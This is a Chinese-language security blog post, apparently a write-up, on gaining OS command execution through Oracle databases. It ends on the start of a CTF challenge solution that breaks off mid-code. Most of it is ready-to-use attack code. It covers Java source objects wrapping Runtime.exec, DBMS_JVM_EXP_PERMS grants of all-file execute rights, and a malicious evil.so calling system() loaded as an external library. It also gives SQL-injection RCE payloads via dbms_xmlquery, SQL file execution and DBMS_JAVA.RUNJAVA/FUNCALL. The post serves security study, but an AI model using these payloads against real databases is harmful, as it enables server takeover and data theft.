<h3 id="查询-Java-Souce-Object-ID"><a href="#查询-Java-Souce-Object-ID" class="headerlink" title="查询 Java Souce Object ID"></a>查询 Java Souce Object ID</h3><p><code>select OBJECT_ID from all_objects where object_name =&#39;Hello&#39;;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478446788-7f786d85-c49b-440f-99b8-967092a79480.png#averageHue=%23454953&clientId=u41a8b913-b9c9-4&from=paste&height=170&id=u112823fc&originHeight=170&originWidth=817&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=202635&status=done&style=none&taskId=u1ececeb0-78ce-4a54-99ec-4c9fb7410ea&title=&width=817" alt="image.png"><br>这里有2个的原因是我创建了2个。所以会有这样的bug，不过影响不大。</p>
<h3 id="高效语法"><a href="#高效语法" class="headerlink" title="高效语法"></a>高效语法</h3><p>为了避免上述的问题，根据官方doc<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478505021-32ea6834-ecbb-456d-8d4b-40f8d875232b.png#averageHue=%23f8f8f7&clientId=u41a8b913-b9c9-4&from=paste&height=496&id=u1f73d6ff&originHeight=496&originWidth=1243&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40491&status=done&style=none&taskId=u385e5d8a-d07f-41e0-a665-2ecd5cd7130&title=&width=1243" alt="image.png"><br>我们可以将语句改造为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED &quot;Hello&quot; AS</span><br><span class="line">   public class Hello &#123;</span><br><span class="line">      public static String say() &#123;</span><br><span class="line">         return &quot;Welcome World&quot;;   &#125; &#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478619144-91d28a8c-2add-45fd-b49d-e28d23083afe.png#averageHue=%23e7e6e5&clientId=u41a8b913-b9c9-4&from=paste&height=602&id=u697fa7ca&originHeight=602&originWidth=928&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63076&status=done&style=none&taskId=u38a09d2e-1041-471a-9fb5-097806933da&title=&width=928" alt="image.png"></p>
<h3 id="删除-Java-Source"><a href="#删除-Java-Source" class="headerlink" title="删除 Java Source"></a>删除 Java Source</h3><p><code>DROP JAVA SOURCE &quot;Hello&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702478691233-a6961063-ee0d-4b52-aa7f-b9f2795cb066.png#averageHue=%23454953&clientId=u41a8b913-b9c9-4&from=paste&height=200&id=u30b26c52&originHeight=200&originWidth=825&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=239277&status=done&style=none&taskId=uc4c80cba-1b43-423f-982e-628f63fad7c&title=&width=825" alt="image.png"></p>
<h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><p>有了Java source后我们就可以利用function去创建一个oracle函数，便于我们后续调用命令<br>创建Java Source</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED &quot;Hello&quot; AS</span><br><span class="line">   public class Hello &#123;</span><br><span class="line">      public static String say(String nothing) &#123;</span><br><span class="line">         return &quot;Welcome World&quot;;   &#125; &#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
<p>创建Function<br><code>create or replace function say(nothing in varchar2) return varchar2 as language java name &#39;Hello.say(java.lang.String) return String&#39;</code><br>调用Function<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702479266043-e7e78cb8-613a-4152-9eff-fb7b2a226f5a.png#averageHue=%234a4e59&clientId=u41a8b913-b9c9-4&from=paste&height=474&id=u8cd17a02&originHeight=474&originWidth=1182&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=769735&status=done&style=none&taskId=u21081da8-6623-4630-960e-745ca7dbeff&title=&width=1182" alt="image.png"></p>
<h3 id="赋权问题"><a href="#赋权问题" class="headerlink" title="赋权问题"></a>赋权问题</h3><p>这里其实会有权限问题，因为我之前设置过，当我们创建完Fucntion后调用，其实是不会执行的，因为需要给用户加权限</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>,<span class="keyword">USER</span>(),<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>,<span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>,<span class="keyword">USER</span>(),<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;writeFileDescriptor&#x27;</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>,<span class="keyword">USER</span>(),<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;readFileDescriptor&#x27;</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
<p>上述3个语句分别对应3个赋值，一般假如是DBA的话用第一个语句就可以了，我们只缺少FilePermission，假如有别的会在报错信息中显示，我们只要添加对应权限即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702479511816-798232c3-3625-4b48-8330-42cfb4a29bb1.png#averageHue=%234e525c&clientId=u41a8b913-b9c9-4&from=paste&height=306&id=u9fe862dc&originHeight=306&originWidth=1167&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=497004&status=done&style=none&taskId=u97831d9a-94c6-4e45-beb8-22de73d169f&title=&width=1167" alt="image.png"><br>上述所讲到的也就是Oracle中命令执行的核心了，即调用任意Java代码，</p>
<h1 id="Lib-加载"><a href="#Lib-加载" class="headerlink" title="Lib 加载"></a>Lib 加载</h1><p>oracle也可以和mysql一样加载一个so文件，因此这里其实也有命令执行的隐患，我们可以如此命令执行。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702520812181-3b137f6b-0200-43a6-a47f-98f839e8c8c3.png#averageHue=%23f9f8f8&clientId=u41a8b913-b9c9-4&from=paste&height=428&id=ud4c3fda9&originHeight=535&originWidth=1239&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48816&status=done&style=none&taskId=u928b1158-66d4-4499-ac2c-2396b9114da&title=&width=991.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702520818847-6c8bcfbf-01ef-40b2-a192-76dd5cc74b53.png#averageHue=%23fbfaf9&clientId=u41a8b913-b9c9-4&from=paste&height=724&id=ucf67752a&originHeight=905&originWidth=1679&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70343&status=done&style=none&taskId=u46b186fe-e9d2-472e-9a6b-f87128c33d8&title=&width=1343.2" alt="image.png"><br>官方文档中也是给出了我们如何添加第三方lib的方法。我们首先需要自己编译生成一个恶意so文件。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="string">&quot;evil.h&quot;</span></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char* cmd(char* command) &#123;</span><br><span class="line"><span class="keyword">system</span>(command);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>evil.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> evil_h_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> evil_h_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>* <span class="title function_">cmd</span><span class="params">(<span class="type">char</span>* command)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>然后将其编译为恶意的so文件。<br><code>gcc -shared -fPIC evil.c -o evil.so</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702522344525-0d990363-5f8f-4008-9ece-a425193c8a5a.png#averageHue=%230e0a07&clientId=u41a8b913-b9c9-4&from=paste&height=108&id=u66fba3c2&originHeight=135&originWidth=742&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17478&status=done&style=none&taskId=u6c46e5f2-c0c7-451b-871e-aeb4bfb7127&title=&width=593.6" alt="image.png"><br>之后我们和上述说的Java source的创建方式一样，创建一个Lib</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace library lib_evil <span class="keyword">as</span> <span class="string">&#x27;/home/oracle/evil.so&#x27;</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702522440258-ff118353-e7ec-4dec-9195-4271d6e20480.png#averageHue=%23010000&clientId=u41a8b913-b9c9-4&from=paste&height=86&id=fK7hQ&originHeight=107&originWidth=623&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3612&status=done&style=none&taskId=u4c4da8da-81ec-4ca8-bf73-881f3710f6b&title=&width=498.4" alt="image.png"><br>成功创建Lib后也是创建一个function，以lib里的代码为模板，这里参考一下网址<br><a target="_blank" rel="noopener" href="https://medium.com/codex/extending-the-sql-and-pl-sql-with-custom-external-functions-and-procedures-214067761061">https://medium.com/codex/extending-the-sql-and-pl-sql-with-custom-external-functions-and-procedures-214067761061</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">function</span> cmd(str varchar2) <span class="keyword">return</span> varchar2 <span class="keyword">as</span> <span class="keyword">language</span> c library lib_evil name &quot;cmd&quot;;</span><br></pre></td></tr></table></figure>
<p>创建好后直接运行会出现如下情况<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702539982623-d7af05c7-97a3-4056-9476-51fe11ffbfd8.png#averageHue=%23020100&clientId=ua980496e-4f1f-4&from=paste&height=169&id=ua6aaa2fd&originHeight=169&originWidth=668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12579&status=done&style=none&taskId=ud6fe24bb-ad18-4eb1-8fe5-405fcac9a2d&title=&width=668" alt="image.png"><br>报错Extproc agent:Invalid DLL Path，这一点上述文章中有提到，我们需要设置一下dll path<br>我们在<code>$ORACLE_HOME/hs/admin/extproc.ora</code>文件的末尾加上一行代码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702540577363-50ced85f-65d6-4668-8587-6f52a0f4a654.png#averageHue=%23020000&clientId=ua980496e-4f1f-4&from=paste&height=813&id=udfc35664&originHeight=813&originWidth=1152&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69186&status=done&style=none&taskId=ufb1c0e38-1390-4d4e-8eb1-ba2d5b777ca&title=&width=1152" alt="image.png"><br>这样设置完后我们再次执行系统命令<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702540605126-9d6de59f-6ca6-4dfa-91e9-3168df01e572.png#averageHue=%23010000&clientId=ua980496e-4f1f-4&from=paste&height=162&id=u26fef4d9&originHeight=162&originWidth=951&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10534&status=done&style=none&taskId=uef934d04-a905-4bb0-8514-43576474068&title=&width=951" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702540610800-74318b2b-74f3-48d9-a307-35ca83d2d184.png#averageHue=%23302f2e&clientId=ua980496e-4f1f-4&from=paste&height=253&id=ua6029518&originHeight=253&originWidth=767&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30694&status=done&style=none&taskId=u8097ad0b-cd8d-48c0-978a-ac0f5bf2ee1&title=&width=767" alt="image.png"><br>成功的执行了系统命令</p>
<h1 id="Oracle-注入下的RCE"><a href="#Oracle-注入下的RCE" class="headerlink" title="Oracle 注入下的RCE"></a>Oracle 注入下的RCE</h1><p>上述介绍的<code>Java Source</code>、<code>Function</code>、<code>Lib</code>是RCE的几个原理，那在实际环境中，我们从外部注入，只能执行单条语句的时候，我们该怎么办呢？</p>
<h2 id="dbms-xmlquery"><a href="#dbms-xmlquery" class="headerlink" title="dbms_xmlquery"></a>dbms_xmlquery</h2><p>影响版本：oracle 10g、11g，部分版本<br>这里我的环境是11.0.2.0版本。<br>在上述低版本中这个函数才可以进行RCE，高版本都被修复了，这个函数本身是用来解析一段XML内容的，但是可以用来执行我们的SQL指令，可以把多条语句一起执行，起到多语句执行的目的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545222213-df63a031-f216-4006-8d3b-8283d90963e2.png#averageHue=%23565a63&clientId=ud8860e01-061f-4&from=paste&height=334&id=u88888559&originHeight=334&originWidth=1159&originalType=binary&ratio=1&rotation=0&showTitle=false&size=572884&status=done&style=none&taskId=u1c3aeec4-9c21-413c-a6ba-020119e8a0b&title=&width=1159" alt="image.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545234749-e438d004-3a56-4fb1-b57c-c0156e61084e.png#averageHue=%23575b63&clientId=ud8860e01-061f-4&from=paste&height=184&id=uf15e6874&originHeight=184&originWidth=1179&originalType=binary&ratio=1&rotation=0&showTitle=false&size=318636&status=done&style=none&taskId=u9d11e1c4-58d9-4a88-8d09-d3ed8756b9e&title=&width=1179" alt="image.png"><br>然后可以查询一下object是否存在</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> OBJECT_ID <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="operator">=</span><span class="string">&#x27;LINXRUNCMD&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545255864-2b1fb29b-a082-4818-9608-553bec1d41c9.png#averageHue=%23474b55&clientId=ud8860e01-061f-4&from=paste&height=138&id=ufeb07621&originHeight=138&originWidth=930&originalType=binary&ratio=1&rotation=0&showTitle=false&size=181963&status=done&style=none&taskId=u7b37e694-6946-48b7-b421-6bf83f0dcd0&title=&width=930" alt="image.png"><br>最后直接命令执行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545276905-058275bc-94e8-4714-80cc-52d11fc796d9.png#averageHue=%234a4e58&clientId=ud8860e01-061f-4&from=paste&height=243&id=ud303b32d&originHeight=243&originWidth=887&originalType=binary&ratio=1&rotation=0&showTitle=false&size=311703&status=done&style=none&taskId=uf8403591-d0e6-4abd-a8e4-d75100f9734&title=&width=887" alt="image.png"></p>
<h2 id="sql-storage"><a href="#sql-storage" class="headerlink" title="sql storage"></a>sql storage</h2><p>这个方法其实就是和sh文件一样，把多个语句放到一个sql文件，然后让oracle执行。也就是说我们需要有一个任意文件写入的点位<br>permission.sql</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> </span><br><span class="line"><span class="string">&#x27;GRANT&#x27;</span>,<span class="keyword">USER</span>(),<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;java.io.FilePermission&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>,<span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
<p>rce.sql</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">and</span> resolve java source named &quot;oraexec&quot; <span class="keyword">as</span></span><br><span class="line">import java.lang.<span class="operator">*</span>;</span><br><span class="line">import java.io.<span class="operator">*</span>;</span><br><span class="line">public class oraexec</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">static</span> String execCommand(String command) throws IOException, InterruptedException &#123;</span><br><span class="line">        Runtime rt <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">int</span> bufSize <span class="operator">=</span> <span class="number">4096</span>;</span><br><span class="line">        byte buffer[] <span class="operator">=</span> <span class="keyword">new</span> byte[bufSize];</span><br><span class="line">        String rc <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        try&#123;</span><br><span class="line">            Process p <span class="operator">=</span> rt.exec(command);</span><br><span class="line">            BufferedInputStream bis <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> BufferedInputStream(p.getInputStream(), bufSize);</span><br><span class="line">            while ((len <span class="operator">=</span> bis.read(buffer, <span class="number">0</span>, bufSize)) <span class="operator">!=</span> <span class="number">-1</span>)&#123;</span><br><span class="line">                rc <span class="operator">+</span><span class="operator">=</span> <span class="keyword">new</span> String(buffer).split(&quot;\0&quot;)[<span class="number">0</span>];;</span><br><span class="line">            &#125;</span><br><span class="line">            bis.close();</span><br><span class="line">            p.waitFor();</span><br><span class="line">            <span class="keyword">return</span> rc;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            rc <span class="operator">=</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        finally</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> rc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace</span><br><span class="line"><span class="keyword">function</span> javae(p_command <span class="keyword">in</span> varchar2) <span class="keyword">return</span> varchar2</span><br><span class="line"><span class="keyword">as</span></span><br><span class="line"><span class="keyword">language</span> java</span><br><span class="line">name <span class="string">&#x27;oraexec.execCommand(java.lang.String) return String&#x27;</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
<p>把这两个文件放到一个位置<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545759967-1d18cdc2-b886-4ce4-9fac-4ef78d395365.png#averageHue=%23000000&clientId=ud8860e01-061f-4&from=paste&height=259&id=u061d6745&originHeight=259&originWidth=587&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7298&status=done&style=none&taskId=u12d9a4e8-aea3-4f61-b7fa-107ea51ef3b&title=&width=587" alt="image.png"><br>最后就直接rce了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545791578-425799eb-ad7b-4c3d-8169-1285b2f4ae10.png#averageHue=%23010000&clientId=ud8860e01-061f-4&from=paste&height=150&id=u87ae72a4&originHeight=150&originWidth=666&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4774&status=done&style=none&taskId=udc5f358a-8921-42b5-9780-b776ae14bf0&title=&width=666" alt="image.png"></p>
<h2 id="dbms-java-runjava-x2F-dbms-java-test-funcall"><a href="#dbms-java-runjava-x2F-dbms-java-test-funcall" class="headerlink" title="dbms_java.runjava&#x2F;dbms_java_test_funcall"></a>dbms_java.runjava&#x2F;dbms_java_test_funcall</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 11g</span></span><br><span class="line"><span class="keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="string">&#x27;oracle/aurora/util/Wrapper touch /tmp/success&#x27;</span>) <span class="keyword">FROM</span> DUAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 10g/11g, 注意10g中还需要readFileDescriptor和writeFileDescriptor</span></span><br><span class="line"><span class="keyword">SELECT</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="string">&#x27;main&#x27;</span>,<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;/sbin/ifconfig&gt;/tmp/1.txt&#x27;</span>) <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure>
<p>当然这几种我都无法实现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702545989674-08ed8e21-4ed0-4473-8435-65bb1fa1c847.png#averageHue=%234e525c&clientId=u3d325f29-e042-4&from=paste&height=426&id=uca8799c9&originHeight=426&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&size=706840&status=done&style=none&taskId=u0d22bad9-4dce-4dac-898c-c66707285e8&title=&width=1181" alt="image.png"><br>提示没有wrapper类，说明还是少了什么文件的。</p>
<h1 id="京麒CTF-2023-ez-oracle"><a href="#京麒CTF-2023-ez-oracle" class="headerlink" title="[京麒CTF 2023] ez_oracle"></a>[京麒CTF 2023] ez_oracle</h1><p>参考：<a target="_blank" rel="noopener" href="https://exp10it.cn/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup/#ez_oracle">https://exp10it.cn/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup&#x2F;#ez_oracle</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> oracledb</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> 